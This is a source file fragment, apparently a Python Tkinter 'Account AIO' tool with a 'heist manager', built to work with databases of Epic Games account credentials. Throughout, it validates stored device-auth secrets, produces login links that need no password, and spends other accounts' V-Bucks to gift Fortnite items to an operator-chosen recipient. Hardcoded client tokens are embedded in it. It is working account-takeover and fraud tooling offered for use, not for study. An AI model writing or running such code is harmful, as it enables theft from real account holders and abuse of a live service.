                button = ttk.Button(self.main_frame, text=f"{file.split("./json")[0]}", command=lambda db=file: load_db__(db))
                button.grid(column=3, padx=10, pady=5, sticky="ew")

    def get_acc_info(self):
        account_id = self.acc_id_entry.get()
        found = False
        found_in = None
        for file in os.listdir(f"./dbs/checked/"):
            if file.endswith(".json"):
                fil = json.load(open(f"./dbs/checked/{file}"))
                if account_id in str(fil):
                    found = True
                    found_in = file
        if found == True:
            file = json.load(open(f"./dbs/checked/{found_in}"))
            for acc in file:
                if acc["account_id"] == account_id:
                    device_id = acc["device_id"]
                    secret = acc["secret"]
                    if "android" in found_in:
                        client_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
                    else:
                        client_token = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
                    url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

                    headers = {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Authorization': f'basic {client_token}'
                    }

                    data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"

                    req = requests.post(url=url, headers=headers, data=data)
                    self.total+=1
                    if req.status_code != 200:
                        messagebox.showerror(title="Error", message="Invalid credentials")
                        print_(f"[Error] Auth failed with {account_id}")
                    else:
                        print_(f"[Success] Auth successful with {account_id}")
                        auth_info = req.json()
                        display_name = auth_info["displayName"]
                        access_token = auth_info["access_token"]
                        try:
                            url = f"https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
                            headers = {
                                "Authorization":f"Bearer {access_token}"
                            }

                            response = requests.get(url, headers=headers)
                            token = response.json()["code"]
                            url_to_send = f"https://www.epicgames.com/id/exchange?exchangeCode={token}&redirectUrl=https://www.epicgames.com/"
                            pyperclip.copy(url_to_send)
                            messagebox.showinfo(title="Success", message="Your web link is copied to the clipboard")
                        except:
                            messagebox.showerror(title="Error", message="Invalid credentials or other error")
                            print(req.content)
                            print(req.status_code)
        else:
            messagebox.showerror(title="Error", message=f"{account_id} not found in any of the DBs")

    def gift(self):
        gift_to_id = self.gift_acc_id_entry.get()
        self.gift_acc_id_entry.destroy()
        cosmetic = self.skin_entry.get()
        self.skin_entry.destroy()
        self.gift_button.destroy()
        try:
            accounts = json.load(open(f"added_{gift_to_id}.json"))
        except:
            messagebox.showerror(title="Error", message="Invalid Account ID")
            return
        acc_mcp = random.choice(accounts)
        mcp_account_id = acc_mcp["account_id"]
        mcp_device_id = acc_mcp["device_id"]
        mcp_secret = acc_mcp["secret"]

        url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': f'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE='
        }

        data = f"grant_type=device_auth&account_id={mcp_account_id}&device_id={mcp_device_id}&secret={mcp_secret}"

        req = requests.post(url=url, headers=headers, data=data)
        while req.status_code != 200:
            print_(f"[Error] Auth failed with {mcp_account_id}")
            acc_mcp = random.choice(accounts)
            mcp_account_id = acc_mcp["account_id"]
            mcp_device_id = acc_mcp["device_id"]
            mcp_secret = acc_mcp["secret"]

            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU='
            }

            data = f"grant_type=device_auth&account_id={mcp_account_id}&device_id={mcp_device_id}&secret={mcp_secret}"

            req = requests.post(url=url, headers=headers, data=data)
        print_(f"[Success] Auth successful with {mcp_account_id}")
        auth_info = req.json()
        display_name = auth_info["displayName"]
        access_token = auth_info["access_token"]
        url = "https://fortnite-api.com/v2/shop"
        catalog = requests.get(url=url, headers=headers).json()["data"]["entries"]
        entry_found = False
        entries = []
        for entry in catalog:
            if cosmetic.lower() in entry["devName"].lower():
                print("FOUND BY NAME")
                entry_found = True
                catalog_entry = entry
                entries.append(catalog_entry)
            elif cosmetic.lower() in entry["offerId"].lower():
                print("FOUND BY OFFER ID")
                entry_found = True
                catalog_entry = entry
        if len(entries) > 1:
            for entry in entries:
                if "bundle" not in str(entry).lower():
                    catalog_entry = entry
                    break
        if not entry_found:
            messagebox.showerror(title="Error", message="Entry not found")
            return
        acc_found = False
        while not acc_found:
            account = random.choice(accounts)
            mcp_account_id = account["account_id"]
            mcp_device_id = account["device_id"]
            mcp_secret = account["secret"]

            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE='
            }

            data = f"grant_type=device_auth&account_id={mcp_account_id}&device_id={mcp_device_id}&secret={mcp_secret}"

            req = requests.post(url=url, headers=headers, data=data)
            while req.status_code != 200:
                
                acc_mcp = random.choice(accounts)
                mcp_account_id = acc_mcp["account_id"]
                mcp_device_id = acc_mcp["device_id"]
                mcp_secret = acc_mcp["secret"]

                url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'

                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Authorization': f'basic M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU='
                }

                data = f"grant_type=device_auth&account_id={mcp_account_id}&device_id={mcp_device_id}&secret={mcp_secret}"

                req = requests.post(url=url, headers=headers, data=data)
                if req.status_code != 200:
                    print_(f"[Error] Auth failed with {mcp_account_id}")
            print_(f"[Success] Auth successful with {mcp_account_id}")
            auth_info = req.json()
            display_name = auth_info["displayName"]
            access_token = auth_info["access_token"]

            url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{mcp_account_id}/client/QueryProfile?profileId=common_core&rvn=-1'

            headers = {
                'Content-Type':'application/json',
                'Authorization':f'Bearer {access_token}'
            }

            composemcp = requests.post(url=url, headers=headers, data="{}")        
            composemcp = composemcp.json()

            try:
                vbucs = []
                items = composemcp['profileChanges'][0]['profile']['items']
                for item in items:
                    if items[item]['templateId'][:12] == "Currency:Mtx":
                        vbucs.append(item)
                vbuc = list(dict.fromkeys(vbucs))
                vbucks = 0
                for abcd in vbuc:
                    vboinkk = composemcp['profileChanges'][0]['profile']['items'][abcd]['quantity']
                    vbucks += vboinkk

            except:
                vbucks = 0
            
            if vbucks >= catalog_entry['finalPrice']:
                account_id = acc_mcp["account_id"]
                device_id = acc_mcp["device_id"]
                secret = acc_mcp["secret"]
                acc_found = True
                break
        if not acc_found:
            messagebox.showerror(title="Error", message="No account with enough vbucks was found lol")
            return
        description = catalog_entry["brItems"][0]["description"]
        item_name = catalog_entry["brItems"][0]["name"]
        #response = requests.get(f"{image}")
        #img = Image.open(BytesIO(response.content))
        #img.show()
        #img_tk = ImageTk.PhotoImage(img)
        #featured_image = ttk.Label(self.main_frame, image=img_tk)
        pyperclip.copy(catalog_entry['offerId'])
        labl = ttk.Label(self.main_frame, text=f"You are about to gift {item_name} to {gift_to_id} for {catalog_entry['finalPrice']} V-Bucks, please be sure that this is all correct.")
        labl.grid(row=1, column=2, pady=10, sticky="ew")

        self.send_gift_button = ttk.Button(self.main_frame, text="Send Gift 🎁", command=lambda offerid=catalog_entry['offerId'], price=catalog_entry['finalPrice'], account_id=mcp_account_id, token=access_token, receiver=gift_to_id: self.send_gift(offerid, price, account_id, token, receiver))
        self.send_gift_button.grid(row=2, column=1, pady=10, sticky="ew")

        self.cancel_gift_button = ttk.Button(self.main_frame, text="Cancel Gift", command=self.heist_manager_select)
        self.cancel_gift_button.grid(row=2, column=2, pady=10, sticky="ew")
        #url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{mcp_account_id}/client/GiftCatalogEntry?profileId=common_core&rvn=-1'
        #headers = {'Content-Type':'application/json','Authorization':f'Bearer {access_token}'}
        #req = requests.post(url=url, headers=headers, data=data)
        #print(req.json())
        #print(req.status_code)

    def send_gift(self, offerid, price, account_id, token, receiver):
        self.send_gift_button.destroy()
        data = json.dumps({
            "offerId": f"{offerid}",
            "currency": f"MtxCurrency",
            "currencySubType": f"", 
            "expectedTotalPrice": price,
            "gameContext": "Frontend.CatabaScreen",
            "receiverAccountIds": [receiver],
            "giftWrapTemplateId": "",
            "personalMessage": f""
        })
        url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/GiftCatalogEntry?profileId=common_core&rvn=-1'
        headers = {'Content-Type':'application/json','Authorization':f'Bearer {token}'}
        req = requests.post(url=url, headers=headers, data=data)
        if "errors.com.epicgames.modules.gamesubcatalog.purchase_not_allowed" in str(req.json()):
            messagebox.showinfo(title="Please Retry", message="This account does not have 2fa enabled.")
        print(req.json())
        print(req.status_code)
        self.heist_manager_select()

    def load_db_select(self):
        self.initialize_frame()

        self.label_ = ttk.Label(self.main_frame, text="Checked")
        self.label_.grid(row=2, column=1, padx=10, pady=5, sticky="ew")
        self.label_ = ttk.Label(self.main_frame, text="Unchecked")
        self.label_.grid(row=2, column=3, padx=10, pady=5, sticky="ew")

        db_folder = "./dbs/"
        for file in os.listdir(db_folder):
            if file.endswith(".json"):
                def load_db(filename):
                    self.loaded_db = f"./dbs/{filename}"
                button = ttk.Button(self.main_frame, text=f"{file.split("./json")[0]}", command=lambda db=file: load_db(db))
                button.grid(column=1, padx=10, pady=5, sticky="ew")

        for file in os.listdir(f"{db_folder}/checked/"):
            if file.endswith(".json"):
                def load_db_checked(filename):
                    self.loaded_db = f"./dbs/checked/{filename}"
                button = ttk.Button(self.main_frame, text=f"{file.split("./json")[0]}", command=lambda db=file: load_db_checked(db))
                button.grid(column=3, padx=10, pady=5, sticky="ew")

    def all_add_select(self):
        self.account_id_entry = ttk.Entry(self.main_frame)
        self.account_id_entry.insert(0, "Account ID")
        self.account_id_entry.grid(row=4, column=2, padx=10, pady=5, sticky="ew")
        self.min_vbucks_entry = ttk.Entry(self.main_frame)
        self.min_vbucks_entry.insert(0, "Min Vbucks")
        self.min_vbucks_entry.grid(row=4, column=3, padx=10, pady=5, sticky="ew")
        self.addall_button = ttk.Button(self.main_frame, text="Add All", command=lambda client="ios": self.all_add(client))
        self.addall_button.grid(row=4, column=4, pady=10, sticky="ew")

    def manage_db_select(self):
        if self.loaded_db == None:
            self.load_db_select()
            messagebox.showerror(title="Error", message="No DB loaded, opening the loading menu.")
            return
        self.initialize_frame()
        self.title(f"Account AIO (Managing {self.loaded_db.split("/")[-1]})")

        self.check_credentials_button = ttk.Button(self.main_frame, text="Check Credentials", command=self.check_credentials)
        self.check_credentials_button.grid(row=2, column=0, pady=10, sticky="ew")

        self.convert_credentials_button = ttk.Button(self.main_frame, text="Convert From IOS to Android", command=lambda client="ios": self.ios_to_android(client, ))
        self.convert_credentials_button.grid(row=3, column=0, pady=10, sticky="ew")

        self.all_add_button = ttk.Button(self.main_frame, text="All Add Specific Person", command=self.all_add_select)
        self.all_add_button.grid(row=4, column=0, pady=10, sticky="ew")

    def get_acc_info_select(self):
        self.initialize_frame()

        self.acc_id_entry = ttk.Entry(self.main_frame)
        self.acc_id_entry.insert(0, "Account ID")
        self.acc_id_entry.grid(row=2, column=1, padx=10, pady=5, sticky="ew")

        self.getinfo_button = ttk.Button(self.main_frame, text="Get Info", command=self.get_acc_info)
        self.getinfo_button.grid(row=3, column=1, pady=10, sticky="ew")
    
    def heist_manager_select(self):
        self.initialize_frame()

        self.gift_select_button = ttk.Button(self.main_frame, text="Gift", command=self.gift_select)
        self.gift_select_button.grid(row=1, column=0, pady=10, sticky="ew")

        self.auth_select_button = ttk.Button(self.main_frame, text="Auth Management", command=self.gift_select)
        self.auth_select_button.grid(row=2, column=0, pady=10, sticky="ew")
    
    def gift_select(self):
        
        self.gift_acc_id_entry = ttk.Entry(self.main_frame)
        self.gift_acc_id_entry.insert(0, "Account ID")
        self.gift_acc_id_entry.grid(row=1, column=1, padx=10, pady=5, sticky="ew")

        self.skin_entry = ttk.Entry(self.main_frame)
        self.skin_entry.insert(0, "Cosmetic")
        self.skin_entry.grid(row=2, column=1, padx=10, pady=5, sticky="ew")

        self.gift_button = ttk.Button(self.main_frame, text="🎁", command=self.gift)
        self.gift_button.grid(row=3, column=1, pady=10, sticky="ew")
        

if __name__ == "__main__":
    app = AIO()
    app.mainloop()